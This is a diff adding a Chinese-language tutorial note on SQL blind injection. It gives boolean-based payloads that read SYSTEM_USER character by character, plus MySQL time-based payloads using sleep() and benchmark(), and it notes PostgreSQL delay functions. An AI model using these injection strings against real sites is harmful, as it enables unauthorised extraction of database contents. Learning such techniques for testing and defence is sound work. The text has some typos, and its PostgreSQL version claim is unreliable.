@@ -1,0 +1,40 @@
+SQL盲注的一些技巧
+
+1.当遇到一个SQL盲注的时候我们要判断注入点，然后构造SQL语句来进行攻击，如下所示：
+
+1、我们构造一个永真句，从而获取数据库的更多信息
+
+2、id = 'wilsonleeee' and SUBSTRING(SYSTEM_USER,1,1) = 'a 来判断登录用户名的第一个字符是否为a
+#-->其中SUBSTRING()函数从SYSTEM_USER的输出中提取了第一个字符
+
+3、通过二分法来依次判断每一个字符如：
+
+id = 'wilsonleeee' and SUBSTRING(SYSTEM_USER,1,1) = 'a （T or F）
+id = 'wilsonleeee' and SUBSTRING(SYSTEM_USER,2,1) = 'b （T or F）
+id = 'wilsonleeee' and SUBSTRING(SYSTEM_USER,3,1) = 'c（T or F）
+id = 'wilsonleeee' and SUBSTRING(SYSTEM_USER,4,1) = 'd（T or F）
+id = 'wilsonleeee' and SUBSTRING(SYSTEM_USER,5,1) = 'e（T or F）
+id = 'wilsonleeee' and SUBSTRING(SYSTEM_USER,6,1) = 'f（T or F）
+
+4、也可以通过asic编码来判断如：
+
+id = 'wilsonleeee' and ASCII(SUBSTRING(SYSTEM_USER,1,1)) > 100 （T or F）类似的来确定字符的范围
+
+
+2.那么同时还有另外一种方式来提取SQL盲注漏洞中的数据，和第一种不同的是，第一种是一种推断攻击技术以后靠的是易受攻击页面发送的响应，第二种方式是使用传输通道而不是页面响应。他的传输通多包括了DNS、email和HTTP请求。
+
+2.1基于时间的技术：我们需要能够根据页面响应中的某一属性来区分两种不同的状态。如：发出请求到响应到达这段时间的差异，当某一状态为真的时候，如果能让响应暂停几秒钟，而状态为假的时候，能够不出现暂停，那么我们给就可以使用这种推断的方式。
+
+·MySQL延迟
+2.1.1 sleep()函数
+	' union select if (ASCII(SUBSTRING(SYSTEM_USER,1,1)) > 100, sleep(1),1)# 截断SQL语句的作用
+	
+2.1.2 benchmark(N,表达式)函数
+	' union select if (ASCII(SUBSTRING(SYSTEM_USER,1,1)) > 100, benchmark(1000,rand()),1)#
+
+MySQL基于时间的推断攻击几乎都会在查询的where字句中引入延迟，但由于where字句根据每一行进行评估，因此人户一个延迟都要根据它所比较的字句的行数来进行评估。
+
+·postgreSQL延迟
+2.1.3 如果是8.1以及以下的版本，可以使用sleep()函数
+
+2.1.4 如果是8.2以及更高的版本，要使用pg_sleep()函数
